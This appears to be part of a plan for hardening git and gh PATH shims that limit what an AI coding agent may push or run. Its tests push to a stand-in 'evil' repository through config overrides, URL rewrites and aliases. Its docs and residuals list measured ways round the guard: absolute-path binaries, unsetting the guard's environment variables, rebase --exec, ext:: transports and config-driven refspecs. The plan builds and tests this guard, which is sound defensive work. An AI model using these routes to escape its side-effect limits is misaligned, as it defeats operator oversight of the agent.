  git -c remote.pushDefault=evil -c remote.evil.url=https://github.com/evil/x.git push
FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "URL rewrite" \
  git -c url.https://github.com/evil/.insteadOf=https://nowhere.example/ \
  push https://github.com/o/r.git feat
"$REAL_GIT_BIN" remote add evil https://github.com/evil/x.git
FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "not the run's repository" git push evil feat
FACTORY_SIDE_EFFECT_LEVEL=5 check allow git -c remote.origin.pushurl=https://github.com/evil/x.git push origin feat
# Fallback baseline (no FACTORY_REPO_SLUG): origin's persisted URL.
FACTORY_REPO_SLUG= FACTORY_SIDE_EFFECT_LEVEL=4 check allow git push origin feat
FACTORY_REPO_SLUG= FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "not the run's repository" \
  git -c remote.origin.pushurl=https://github.com/evil/x.git push origin feat
FACTORY_REPO_SLUG= FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "not the run's repository" \
  git push https://github.com/evil/x.git feat
FACTORY_REPO_SLUG= FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "not the run's repository" git push evil feat
"$REAL_GIT_BIN" remote remove evil
```

`FACTORY_REPO_SLUG=` (empty) exercises the fallback. The shim tests
`-n "${FACTORY_REPO_SLUG:-}"`, so empty and unset behave the same, and a prefix assignment
keeps the `PASS`/`FAIL` counters in this shell, where a subshell `unset` would lose them.

- [ ] **Step 4.2: Run; verify fail.**

```bash
env -u FACTORY_SIDE_EFFECT_LEVEL bash tests/test_side_effect_shims.sh 2>&1 | grep -E '^(PASS=|FAIL)' | sed 's/ -> .*//'
```

Expected: `PASS=161 FAIL=11`. All 11 new denies fail and the 5 new allows pass.

- [ ] **Step 4.3: Capture `--repo` in the own-branch push loop** (two edits in `scripts/shims/git`).

In `scripts/shims/git`, find this exact text:

```bash
        FORCE=0; DELETE=0; WIDE=""; REMOTE=""; REFSPECS=(); SKIP=0
        for arg in "${PUSH_ARGS[@]}"; do
          if [ "$SKIP" = "1" ]; then SKIP=0; continue; fi
```

Replace it with:

```bash
        FORCE=0; DELETE=0; WIDE=""; REMOTE=""; REPO_OPT=""; REFSPECS=(); SKIP=0
        for arg in "${PUSH_ARGS[@]}"; do
          if [ "$SKIP" = "repo" ]; then REPO_OPT="$arg"; SKIP=0; continue; fi
          if [ "$SKIP" = "1" ]; then SKIP=0; continue; fi
```

In `scripts/shims/git`, find this exact text:

```bash
            -o|--push-option|--receive-pack|--exec|--repo) SKIP=1 ;;
            -*) : ;;
```

Replace it with:

```bash
            -o|--push-option|--receive-pack|--exec) SKIP=1 ;;
            --repo) SKIP=repo ;;
            --repo=*) REPO_OPT="${arg#--repo=}" ;;
            -*) : ;;
```

`--repo=*` must sit above the catch-all `-*) : ;;`. Before this change `--repo=<url>` was
silently ignored.

- [ ] **Step 4.4: Define the destination check above the main `case`.**

In `scripts/shims/git`, find this exact text:

```bash
case "$VERB1" in
  commit) _in_list "commit" "${GIT_DENIED[@]}" && deny "commit" ;;
```

Replace it with:

```bash
# #553 / spec Requirement 4: at own_branch_only the push must also land on the run's own
# repository. Every push URL real git would use (`get-url --push --all`, so pushurl,
# insteadOf and pushInsteadOf apply exactly as in the push) must equal the baseline.
_norm_url() { local u="${1%/}"; printf '%s' "${u%.git}"; }
_cfg_or_deny() {  # sets CFG_VAL; returns 0 found / 1 unset; any other failure denies
  local rc=0
  CFG_VAL=$(_git_config --get "$1" 2>/dev/null) || rc=$?
  [ "$rc" -le 1 ] || deny "push (config lookup failed)"
  return "$rc"
}
_check_push_destination() {
  local baseline remote="$REMOTE" cur="" urls url rc=0
  if [ -n "${FACTORY_REPO_SLUG:-}" ]; then
    baseline="https://github.com/${FACTORY_REPO_SLUG}"
  else
    # Degraded fallback (spec R4): origin's URL as persisted, read with none of this
    # invocation's -c/--config-env/env config. Weaker than the slug -- a persisted
    # `git remote set-url origin` or persisted insteadOf moves this baseline with it,
    # the same kind of documented degradation as the FACTORY_RUN_BRANCH comment below.
    local loc=() k=0
    while [ "$k" -lt "${#_GLOBAL_OPTS[@]}" ]; do
      case "${_GLOBAL_OPTS[$k]}" in
        -C|--git-dir|--work-tree) loc+=("${_GLOBAL_OPTS[$k]}" "${_GLOBAL_OPTS[$((k + 1))]:-}"); k=$((k + 2)) ;;
        --git-dir=*|--work-tree=*) loc+=("${_GLOBAL_OPTS[$k]}"); k=$((k + 1)) ;;
        -c|--namespace|--exec-path|--super-prefix|--config-env) k=$((k + 2)) ;;
        *) k=$((k + 1)) ;;
      esac
    done
    baseline=$(env -u GIT_CONFIG -u GIT_CONFIG_COUNT -u GIT_CONFIG_PARAMETERS \
      -u GIT_CONFIG_GLOBAL -u GIT_CONFIG_SYSTEM \
      "$REAL_GIT" "${loc[@]}" config --get remote.origin.url 2>/dev/null) \
      || deny "push (no baseline repository)"
  fi
  # Which remote, in git's own order: positional, --repo, branch.<b>.pushRemote,
  # remote.pushDefault, branch.<b>.remote, origin.
  [ -n "$remote" ] || remote="$REPO_OPT"
  if [ -z "$remote" ]; then
    cur=$("$REAL_GIT" "${_GLOBAL_OPTS[@]}" symbolic-ref --short -q HEAD 2>/dev/null || true)
    if [ -n "$cur" ] && _cfg_or_deny "branch.${cur}.pushRemote"; then remote="$CFG_VAL"
    elif _cfg_or_deny remote.pushDefault; then remote="$CFG_VAL"
    elif [ -n "$cur" ] && _cfg_or_deny "branch.${cur}.remote"; then remote="$CFG_VAL"
    else remote="origin"
    fi
  fi
  urls=$("$REAL_GIT" "${_GLOBAL_OPTS[@]}" remote get-url --push --all "$remote" 2>/dev/null) || rc=$?
  if [ "$rc" = "0" ]; then
    [ -n "$urls" ] || deny "push (unresolvable destination)"
    while IFS= read -r url; do
      [ "$(_norm_url "$url")" = "$(_norm_url "$baseline")" ] \
        || deny "push (destination is not the run's repository)"
    done <<<"$urls"
  else
    # Not a configured remote: a literal URL or path. It must be the baseline itself, and
    # no url.*.insteadOf/pushInsteadOf may be in effect (get-url cannot resolve those
    # for a literal, so the shim cannot see where it would really go).
    [ "$(_norm_url "$remote")" = "$(_norm_url "$baseline")" ] \
      || deny "push (destination is not the run's repository)"
    rc=0
    _git_config --get-regexp '^url\..*\.(insteadof|pushinsteadof)$' >/dev/null 2>&1 || rc=$?
    case "$rc" in
      0) deny "push (URL rewrite in effect for a literal destination)" ;;
      1) : ;;
      *) deny "push (config lookup failed)" ;;
    esac
  fi
}

case "$VERB1" in
  commit) _in_list "commit" "${GIT_DENIED[@]}" && deny "commit" ;;
```

- [ ] **Step 4.5: Call it after the own-branch refspec loop.**

In `scripts/shims/git`, find this exact text:

```bash
          [ "$TARGET_BRANCH" != "$OWN_BRANCH" ] && deny "push (not own branch)"
        done
        ;;
```

Replace it with:

```bash
          [ "$TARGET_BRANCH" != "$OWN_BRANCH" ] && deny "push (not own branch)"
        done
        _check_push_destination
        ;;
```

- [ ] **Step 4.6: Run; verify pass.**

```bash
bash -n scripts/shims/git && env -u FACTORY_SIDE_EFFECT_LEVEL bash tests/test_side_effect_shims.sh 2>&1 | grep -E '^(PASS=|FAIL)' | sed 's/ -> .*//'
```

Expected: `PASS=172 FAIL=0`.

- [ ] **Step 4.7: Commit.**

```bash
git add scripts/shims/git tests/test_side_effect_shims.sh
git commit -m "fix(shim/git): level-4 push must land on the run's repository (#553)"
```


### Task 5: gh: resolve aliases, deny a flag before the command and extensions below level 5 (spec R2-gh, R5: items 6, 7, 12)

**Files:**
- Modify: `tests/test_side_effect_shims.sh`
- Modify: `scripts/shims/gh`

- [ ] **Step 5.1: Write the failing tests.**

In `tests/test_side_effect_shims.sh`, insert this block immediately **above** the line `# --- end #553 cases ---`:

```bash
# gh aliases (no token in the environment): judged as their expansion, tighten-only.
"$REAL_GH_BIN" alias set p 'pr create' >/dev/null 2>&1
"$REAL_GH_BIN" alias set xs secret >/dev/null 2>&1
"$REAL_GH_BIN" alias set il 'issue list' >/dev/null 2>&1
"$REAL_GH_BIN" alias set --shell sh 'gh pr create' >/dev/null 2>&1
FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "pr create" gh p --title x --body y
FACTORY_SIDE_EFFECT_LEVEL=5 check allow gh p --title x --body y
FACTORY_SIDE_EFFECT_LEVEL=1 check_deny_reason "secret list" gh xs list
FACTORY_SIDE_EFFECT_LEVEL=1 check_deny_reason "'il' is denied" gh il
FACTORY_SIDE_EFFECT_LEVEL=3 check_deny_reason "'il' is denied" gh il
FACTORY_SIDE_EFFECT_LEVEL=4 check allow gh il
FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "shell alias|shell-style parsing" gh sh
SIDE_EFFECT_SHIM_CLASSIFY_ONLY=1 FACTORY_SIDE_EFFECT_LEVEL=5 \
  check_deny_reason "outside a nested check" gh pr view 1
# gh extensions: denied at levels 1-4, unchanged at 5.
mkdir -p "$XDG_DATA_HOME/gh/extensions/gh-someext"
printf '#!/bin/sh\necho SOMEEXT "$@"\n' > "$XDG_DATA_HOME/gh/extensions/gh-someext/gh-someext"
chmod +x "$XDG_DATA_HOME/gh/extensions/gh-someext/gh-someext"
FACTORY_SIDE_EFFECT_LEVEL=1 check_deny_reason "\(extension\)" gh someext list
FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "\(extension\)" gh someext
FACTORY_SIDE_EFFECT_LEVEL=5 check allow gh someext
FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "extension install" gh extension install o/x
FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "extension install" gh ext install o/x
FACTORY_SIDE_EFFECT_LEVEL=5 check allow gh extension install o/x
FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "flag before" gh -R o/r pr create
```

- [ ] **Step 5.2: Run; verify fail.**

```bash
env -u FACTORY_SIDE_EFFECT_LEVEL bash tests/test_side_effect_shims.sh 2>&1 | grep -E '^(PASS=|FAIL)' | sed 's/ -> .*//'
```

Expected: `PASS=178 FAIL=9`. The 9 new denies fail. The `'il' is denied` rows already pass
(tighten-only: the literal form is denied today), and so do the 4 allows.

- [ ] **Step 5.3: Read the numeric level from the profile.**

In `scripts/shims/gh`, find this exact text:

```bash
LEVEL_NAME=$(jq -r '.name' <<<"$PROFILE_JSON")
GH_MODE=$(jq -r '.gh_mode' <<<"$PROFILE_JSON")
```

Replace it with:

```bash
LEVEL_NAME=$(jq -r '.name' <<<"$PROFILE_JSON")
LEVEL_NUM=$(jq -r '.level' <<<"$PROFILE_JSON")
GH_MODE=$(jq -r '.gh_mode' <<<"$PROFILE_JSON")
```

- [ ] **Step 5.4: Classify-only guard on the version/help passthrough.**

In `scripts/shims/gh`, find this exact text:

```bash
_GH_ARGS=("$@")
VERB1="${_GH_ARGS[0]:-}"
# Version/help never mutate anything and gh accepts them at any level.
case "$VERB1" in --version|--help|-h|help|version) exec "$REAL_GH" "$@" ;; esac
```

Replace it with:

```bash
# #553: a nested classify-only run (an alias expansion being judged, see _finish) must
# never exec anything -- it only reports deny (exit 1) or pass (exit 0).
_CLASSIFY_ONLY="${SIDE_EFFECT_SHIM_CLASSIFY_ONLY:-}"
# Only this shim sets it, always with a depth >= 1. At depth 0 it came from the caller's
# own environment: fail loudly rather than silently do nothing on every call.
if [ "$_CLASSIFY_ONLY" = "1" ] && [ "${SIDE_EFFECT_SHIM_DEPTH:-0}" = "0" ]; then
  deny "SIDE_EFFECT_SHIM_CLASSIFY_ONLY outside a nested check"
fi

_GH_ARGS=("$@")
VERB1="${_GH_ARGS[0]:-}"
# Version/help never mutate anything and gh accepts them at any level.
case "$VERB1" in --version|--help|-h|help|version)
  [ "$_CLASSIFY_ONLY" = "1" ] && exit 0
  exec "$REAL_GH" "$@" ;;
esac
```

- [ ] **Step 5.5: Add `_finish` (alias resolution, flag-before check, extension check, exec).**

In `scripts/shims/gh`, find this exact text:

```bash
if [ "$VERB1" = "api" ]; then
```

Replace it with:

```bash
# #553 / spec Requirements 2 and 5: every path that would exec real gh comes here once
# the literal form has passed. gh may run something else under VERB1 (an alias, an
# installed extension), so the expanded form must pass the same classification too
# (tighten-only), at every level. Each check fails closed.
_finish() {
  local depth="${SIDE_EFFECT_SHIM_DEPTH:-0}" aliases line exp="" found=0 exts name toks=()
  case "$depth" in ''|*[!0-9]*) deny "${VERB1:-gh} (alias chain depth)" ;; esac
  if [ -n "$VERB1" ]; then
    # `gh -R o/r pr create`: a flag in VERB1's place hides the command from the tables.
    [[ "$VERB1" =~ ^[A-Za-z0-9][A-Za-z0-9_-]*$ ]] || deny "$VERB1 (flag before the command)"
    # gh refuses an alias over a core command, so only a non-core VERB1 can match here.
    aliases=$("$REAL_GH" alias list 2>/dev/null) || deny "$VERB1 (alias resolution failed)"
    while IFS= read -r line; do
      case "$line" in
        "$VERB1:") found=1; exp="" ;;
        "$VERB1: "*) found=1; exp="${line#"$VERB1: "}" ;;
      esac
    done <<<"$aliases"
    if [ "$found" = "1" ]; then
      [ "$depth" -lt 5 ] || deny "$VERB1 (alias chain too deep)"
      case "$exp" in
        ''|'|'*|'>'*) deny "$VERB1 (empty or multi-line alias)" ;;
        '!'*) deny "$VERB1 (shell alias)" ;;
        *[\"\'\\\$]*) deny "$VERB1 (alias value needs shell-style parsing)" ;;
      esac
      read -ra toks <<<"$exp"
      SIDE_EFFECT_SHIM_CLASSIFY_ONLY=1 SIDE_EFFECT_SHIM_DEPTH=$((depth + 1)) \
        "$SHIM_DIR/gh" "${toks[@]}" "${_GH_ARGS[@]:1}" || exit $?
    fi
  fi
  # Requirement 5, levels 1-4: an extension binary acts with gh's own credentials and no
  # verb-level check, so neither installing one nor running one is allowed below level 5.
  if [ "$LEVEL_NUM" -le 4 ]; then
    case "$VERB1" in
      extension|extensions|ext)
        case "$VERB2" in install|upgrade|exec) deny "extension $VERB2" ;; esac ;;
    esac
    if [ -n "$VERB1" ]; then
      # `gh extension list` only reads the local extensions directory but exits 4 when no
      # token is present at all; a placeholder for this one call keeps the check working
      # without a token (and with one, the real token is passed unchanged).
      exts=$(GH_TOKEN="${GH_TOKEN:-${GITHUB_TOKEN:-placeholder}}" "$REAL_GH" extension list 2>/dev/null) \
        || deny "$VERB1 (extension resolution failed)"
      while IFS=$'\t' read -r name _; do
        if [ "$name" = "gh $VERB1" ]; then deny "$VERB1 (extension)"; fi
      done <<<"$exts"
    fi
  fi
  [ "$_CLASSIFY_ONLY" = "1" ] && exit 0
  exec "$REAL_GH" "${_GH_ARGS[@]}"
}

if [ "$VERB1" = "api" ]; then
```

- [ ] **Step 5.6: Route all three `exec "$REAL_GH" "$@"` sites through `_finish`** (three edits).

In `scripts/shims/gh`, find this exact text:

```bash
      deny "api ${METHOD}"
    fi
  fi
  exec "$REAL_GH" "$@"
fi
```

Replace it with:

```bash
      deny "api ${METHOD}"
    fi
  fi
  _finish
fi
```

In `scripts/shims/gh`, find this exact text:

```bash
      || _in_list "$TWO_WORD" "${GH_ALLOWED[@]}"; then
    exec "$REAL_GH" "$@"
  fi
```

Replace it with:

```bash
      || _in_list "$TWO_WORD" "${GH_ALLOWED[@]}"; then
    _finish
  fi
```

In `scripts/shims/gh`, find this exact text:

```bash
    deny "$DISPLAY_VERB"
  fi
  exec "$REAL_GH" "$@"
fi
```

Replace it with:

```bash
    deny "$DISPLAY_VERB"
  fi
  _finish
fi
```

Afterwards `grep -n 'exec "$REAL_GH"' scripts/shims/gh` must show exactly three lines: the
inactive-shim passthrough (line ~23), the version/help passthrough, and the one inside
`_finish`.

Implementation notes (measured on gh 2.105.0):
- `gh alias list` prints `name: expansion`, one per line. It exits 0 with no token and an
  empty config dir, and always lists the built-in `co: pr checkout`. A `--shell` alias prints
  as `sh: '!…'`, so it leads with a quote and is denied either way (`shell alias|shell-style
  parsing`). Lines of a multi-line YAML block are indented, so they can never match
  `VERB1:`.
- `gh extension list` lines are tab-separated (`gh someext<TAB>…`). It exits 4 with no token
  at all, hence the placeholder token for that one subprocess (spec R5).
- `ext`/`extensions` are cobra aliases of `extension` (`gh ext --help` → `ALIASES gh
  extensions, gh ext`), so `gh ext install` is covered.

- [ ] **Step 5.7: Run; verify pass.**

```bash
bash -n scripts/shims/gh && env -u FACTORY_SIDE_EFFECT_LEVEL bash tests/test_side_effect_shims.sh 2>&1 | grep -E '^(PASS=|FAIL)' | sed 's/ -> .*//'
```

Expected: `PASS=187 FAIL=0`.

- [ ] **Step 5.8: Commit.**

```bash
git add scripts/shims/gh tests/test_side_effect_shims.sh
git commit -m "fix(shim/gh): judge alias expansions, deny flag-first calls and extensions below level 5 (#553)"
```


### Task 6: Regression pins: `gh api` body-as-POST, legitimate factory usage, known-verb pin (spec R6, operator decision 2)

These pin behavior that is already correct. TDD's "verify fail" step does not apply: the
point is that they pass now and fail if a future change regresses them.

**Files:**
- Modify: `tests/test_side_effect_shims.sh`

- [ ] **Step 6.1: Add the pins.**

In `tests/test_side_effect_shims.sh`, insert this block immediately **above** the line `# --- end #553 cases ---`:

```bash
# Item 8 regression pin: a body with no -X is a POST.
FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "api POST" gh api repos/o/r/issues -f title=x
# Legitimate factory usage still passes with no token.
FACTORY_SIDE_EFFECT_LEVEL=3 check allow gh issue comment 1 --body hi
FACTORY_SIDE_EFFECT_LEVEL=3 check allow gh issue view 1
FACTORY_SIDE_EFFECT_LEVEL=3 check allow gh issue create --title x
FACTORY_SIDE_EFFECT_LEVEL=3 check allow gh issue edit 1 --add-label x
FACTORY_SIDE_EFFECT_LEVEL=1 check allow gh pr view 1
FACTORY_SIDE_EFFECT_LEVEL=1 check allow gh pr list
FACTORY_SIDE_EFFECT_LEVEL=1 check allow gh api repos/o/r
FACTORY_SIDE_EFFECT_LEVEL=4 check allow gh pr view 1
FACTORY_SIDE_EFFECT_LEVEL=5 check allow gh pr create
FACTORY_SIDE_EFFECT_LEVEL=5 check allow gh api graphql -f query=x

# Known-verb pin (spec operator decision 2): every git verb the factory's own commands,
# refinement skills, scripts, entrypoint and workflows invoke must be in git's known-verb
# set, or the shim would deny it. Pinned, not grepped at test time (prose such as "git
# reports" would make a live grep flaky); rebuilt from:
#   grep -rhoE '\bgit (-C [^ ]+ )?[a-z][a-z-]+' commands/ refinement-skills/ scripts/ \
#     entrypoint.sh workflows/*.yaml | awk '{print $NF}' | sort -u   (then hand-pruned)
_KNOWN_VERBS=$("$REAL_GIT_BIN" --list-cmds=main)
for v in add apply blame branch cat-file check-ignore checkout clean clone commit config diff diff-tree fetch \
    for-each-ref grep log ls-files ls-remote merge merge-base mv pull push rebase remote reset \
    rev-list rev-parse rm show stash status symbolic-ref update-index write-tree; do
  if grep -qxF -- "$v" <<<"$_KNOWN_VERBS"; then
    PASS=$((PASS+1))
  else
    echo "FAIL: factory git verb '$v' is not in git --list-cmds=main"; FAIL=$((FAIL+1))
  fi
done
```

- [ ] **Step 6.2: Run; verify pass.**

```bash
env -u FACTORY_SIDE_EFFECT_LEVEL bash tests/test_side_effect_shims.sh 2>&1 | grep -E '^(PASS=|FAIL)' | sed 's/ -> .*//'
```

Expected: `PASS=234 FAIL=0`. The block adds 47 assertions: 1 `api POST`, 10 legitimate-usage
allows and 36 known verbs.

- [ ] **Step 6.3: Sanity-check the pins can fail.** Temporarily break the known-verb pin and
  confirm the suite notices, then restore:

```bash
sed -i 's/symbolic-ref update-index write-tree; do/symbolic-ref update-index write-tree not-a-verb; do/' tests/test_side_effect_shims.sh
env -u FACTORY_SIDE_EFFECT_LEVEL bash tests/test_side_effect_shims.sh 2>&1 | grep -E "not-a-verb|^PASS="
sed -i 's/ write-tree not-a-verb; do/ write-tree; do/' tests/test_side_effect_shims.sh
```

Expected: `FAIL: factory git verb 'not-a-verb' is not in git --list-cmds=main` and
`PASS=234 FAIL=1`. The second `sed` restores the line. Re-run Step 6.2 and get
`PASS=234 FAIL=0`.

- [ ] **Step 6.4: Commit.**

```bash
git add tests/test_side_effect_shims.sh
git commit -m "test(shims): pin gh api body-as-POST, legitimate factory calls and factory git verbs (#553)"
```


### Task 7: Docs: say plainly that the shim is a PATH guard, not a sandbox (spec R8)

**Files:**
- Modify: `docs/adapter-authoring-guide.md` (section `## Side-effect levels`)

- [ ] **Step 7.1: Edit the guide.**

In `docs/adapter-authoring-guide.md`, find this exact text:

```markdown
**What this does and does not claim.** The shim (`scripts/shims/git`, `scripts/shims/gh`)
is a `PATH` shim guarding the two CLIs a Bash-tool subprocess would otherwise reach
directly; a process invoking `/usr/bin/git` by absolute path bypasses it. v1 is a policy
boundary against mistaken or prompt-injected behavior, not a security boundary against a
deliberately hostile agent — see
```

Replace it with:

```markdown
Since #553 the shims also judge what git/gh would actually run, not only the literal
verb, at every level: an alias — from `-c`, `--config-env`, `GIT_CONFIG_*` env, any config
file, or `gh alias` — is resolved through the real binary and its expansion must pass the
same checks as the literal form (an alias can add a denial, never remove one). Denied
outright: shell aliases (`!…`), external `git-<verb>` commands and any verb git does not
list in `--list-cmds=main` (so `git lfs` is denied for phase agents), a global option the
shim does not know (`git --no-advice push`), a flag before the `gh` command (`gh -R o/r pr
create`), and `core.sshCommand`/`GIT_SSH_COMMAND`/`GIT_SSH` on every verb. At
levels 1–4 `gh extension install|upgrade|exec` and running an installed extension are
denied. At level 4 every push URL (`remote get-url --push --all`, so `pushurl` and
`insteadOf` count) must be `https://github.com/${FACTORY_REPO_SLUG}`. Without
`FACTORY_REPO_SLUG` the baseline is origin's persisted URL, which is weaker: a persisted
`remote set-url` moves it. Every lookup fails closed: if real git cannot answer (for
example a nonexistent `-C` directory, or `--git-dir` pointing at a repository that does
not exist yet) the call is denied with `config lookup failed` or `verb resolution
failed`.

**What this does and does not claim.** The shim (`scripts/shims/git`, `scripts/shims/gh`)
is a `PATH` guard for a fallible agent, not a sandbox. It guards the two CLIs a Bash-tool
subprocess would otherwise reach directly. Out of its reach, by construction:

- calling the real binary by absolute path (`/usr/bin/git`, `/usr/bin/gh`);
- unsetting `CLAUDECODE` or `FACTORY_SIDE_EFFECT_LEVEL`, which turns the shim into a
  passthrough;
- direct HTTP to GitHub with the token (`curl` against the API);
- any process git itself spawns — hooks, `rebase --exec`, `core.editor`, `core.pager`,
  `bisect run`, `submodule foreach`, `credential.helper`, and likewise an `ext::` transport,
  a non-builtin command run from an `--exec-path`/`GIT_EXEC_PATH` override, and
  `--upload-pack`/`--receive-pack`/`--exec` or `remote.*.uploadpack`/`receivepack` on a
  local-path or ssh transport — because git
  puts its exec-path ahead of the shim on that child's `PATH`, so a nested `git push` there
  reaches real git (measured: `git rebase --exec 'git push …'`, `git -c
  protocol.ext.allow=always fetch 'ext::…'` and `git --exec-path=<dir> submodule` all push
  at level 2). This class is a documented residual of #553, tracked in a follow-up ticket.

v1 is a policy boundary against mistaken or prompt-injected behavior, not a security
boundary against a deliberately hostile agent — see
```

The sentence the doc tests pin stays verbatim: `not a security boundary against a
deliberately hostile agent`. `tests/test_factory_target_boundary_doc.py` pins it in
`docs/factory-target-boundary.md`, which this ticket does not touch. The `ext::` and
`--exec-path` residual lines were measured with the prototype: both pushed to a second local
bare repo at level 2. The `--upload-pack`/`receivepack` line was added from architect
cycle 2 and was not measured separately. The fail-closed sentence names the
`config lookup failed` outcome that cycle 2 measured for a nonexistent `-C`. They belong to the same git-spawns-a-child class the spec defers
(R9.1).

- [ ] **Step 7.2: Verify the doc tests.**

```bash
PYTHONPATH=scripts python -m pytest tests/test_adapter_authoring_guide.py tests/test_factory_target_boundary_doc.py -q
```

Expected: all pass.

- [ ] **Step 7.3: Commit.**

```bash
git add docs/adapter-authoring-guide.md
git commit -m "docs(side-effect): the shim is a PATH guard, not a sandbox; list #553 checks and residuals"
```


### Task 8: Full verification and scope check

**Files:** none modified.

- [ ] **Step 8.1: Shim suite, in a clean env and with the factory's ambient env.**

```bash
env -u FACTORY_SIDE_EFFECT_LEVEL bash tests/test_side_effect_shims.sh | tail -2
bash tests/test_side_effect_shims.sh | tail -2
```

Expected: both print `PASS=234 FAIL=0` and `PASS`. The second run proves hermeticity inside
a factory container, where `CLAUDECODE=1`, `FACTORY_SIDE_EFFECT_LEVEL=5`, `GH_TOKEN` and
`FACTORY_REPO_SLUG` are already set and the baked shim is first on `PATH`.

- [ ] **Step 8.2: Python suite and the other shell suites CI runs** (unchanged code, so they
  must stay green):

```bash
PYTHONPATH=scripts python -m pytest tests/ -q
for t in $(grep -oE 'bash tests/test_[a-z_]+\.sh' .github/workflows/ci.yml | awk '{print $2}'); do bash "$t" >/dev/null 2>&1 && echo "ok $t" || echo "FAIL $t"; done
```

Expected: pytest passes, and every line reads `ok …`.

- [ ] **Step 8.3: End-to-end smoke with real git** (no stubs, local bare repos, nothing
  leaves `/tmp`):

```bash
S=$(mktemp -d) && git init -q --bare "$S/origin.git" && git init -q --bare "$S/evil.git" \
  && /usr/bin/git clone -q "$S/origin.git" "$S/w" 2>/dev/null && cd "$S/w" \
  && /usr/bin/git checkout -q -b feat && /usr/bin/git -c user.name=x -c user.email=x commit -q --allow-empty -m init
export PATH="$OLDPWD/scripts/shims:/usr/bin:/bin" CLAUDECODE=1; unset FACTORY_REPO_SLUG
FACTORY_SIDE_EFFECT_LEVEL=2 git -c alias.p=push p origin HEAD; echo rc=$?
FACTORY_SIDE_EFFECT_LEVEL=5 git -c 'alias.d=push --delete' d origin feat; echo rc=$?
FACTORY_SIDE_EFFECT_LEVEL=4 FACTORY_RUN_BRANCH=feat git -c remote.origin.pushurl="$S/evil.git" push origin feat; echo rc=$?
FACTORY_SIDE_EFFECT_LEVEL=4 FACTORY_RUN_BRANCH=feat git push -q origin feat; echo rc=$?
/usr/bin/git -C "$S/origin.git" for-each-ref --format='%(refname)'; /usr/bin/git -C "$S/evil.git" for-each-ref | wc -l
cd - >/dev/null
```

Run this from the repo root. Expected: three `side-effect guard: …` lines with `rc=1`, then
`rc=0`. `origin.git` shows `refs/heads/feat` and `evil.git` shows `0`. (`FACTORY_REPO_SLUG`
is unset, so the baseline is origin's persisted URL, the bare repo path.)

- [ ] **Step 8.4: Scope check.**

```bash
git diff --stat origin/main HEAD -- scripts/factory_core/side_effect.py deploy/ .github/workflows/
git diff --name-only origin/main HEAD
```

Expected: the first command prints nothing (spec R7: `side_effect.py` untouched; hard-limit
paths untouched). The second lists only `scripts/shims/git`, `scripts/shims/gh`,
`tests/test_side_effect_shims.sh` and `docs/adapter-authoring-guide.md`, plus the spec, this
plan and `.archon/memory/*` carried over from the refine branch.


## Residuals and follow-ups (not in scope; record in the PR body)

- **Nested-child class** (spec R1/R9.1, operator follow-up ticket): hooks, `rebase --exec`,
  `core.editor`/`core.pager`, `bisect run`, `submodule foreach`, `credential.helper`.
  Measured during planning, with the patched shim, as two more members of this class: `git
  -c protocol.ext.allow=always fetch 'ext::sh -c git% push% …'` and `git --exec-path=<dir>
  submodule …` (or `GIT_EXEC_PATH`) both push at level 2. Both are named in the Task 7
  docs. They should be added to the operator's follow-up ticket rather than closed here,
  because closing them needs either a new deny on `protocol.*.allow`/`--exec-path` (a gate
  change needing its own reviewed spec) or control over git's exec-path in the image.
  Architect review cycle 1 noted that both are detectable from argv/env alone and could be
  denied here cheaply. That is an operator decision at the plan gate. If the operator
  wants them in this ticket, the change is two more checks at the Task 3 site plus
  `check_deny_reason` rows. This plan does not add them unilaterally, because spec R9.1
  puts the class out of scope.
- **Level-4 refspec-from-config (architect cycle 2, measured, pre-existing, not one of
  spec items 1-12):** with no refspec on the command line the shim judges `HEAD` (the own
  branch). But `git -c push.default=upstream push origin` (with
  `branch.feat.merge=refs/heads/main`), `git -c remote.origin.push=HEAD:main push origin`,
  `remote.<r>.mirror=true` and `push.default=matching` all move the remote `main` at level 4.
  This is an **operator decision at the plan gate**. Either extend Task 4: at
  `own_branch_only`, deny a refspec-less push when `remote.<r>.push` or `remote.<r>.mirror`
  is set or `push.default` is not unset/`simple`/`current`, all via `_git_config`. Or file
  it as a follow-up. No factory phase runs at level 4 today (`side_effect.phase_levels` are
  all 5, and level ≥ 4 loops are rejected by `handoff.py`), so deferring does not expose a
  live run.
- **gh level-4 table gaps** (for example `gh workflow run`) stay out of scope per operator
  decision 9.3.

## Self-review

- [x] `**Issue:** #553` line directly under the title.
- [x] No placeholders. Every step names exact files and shows full code, and every run
  step shows the command and its measured output.
- [x] Only the four in-scope files change, and `side_effect.py` is untouched (Task 8.4).
- [x] Every spec item 1-12 and requirements R2-R8 map to a task (traceability table).
- [x] The 113 existing assertions stay byte-identical (234 total). Only the harness preamble, stubs and
  a new helper change.
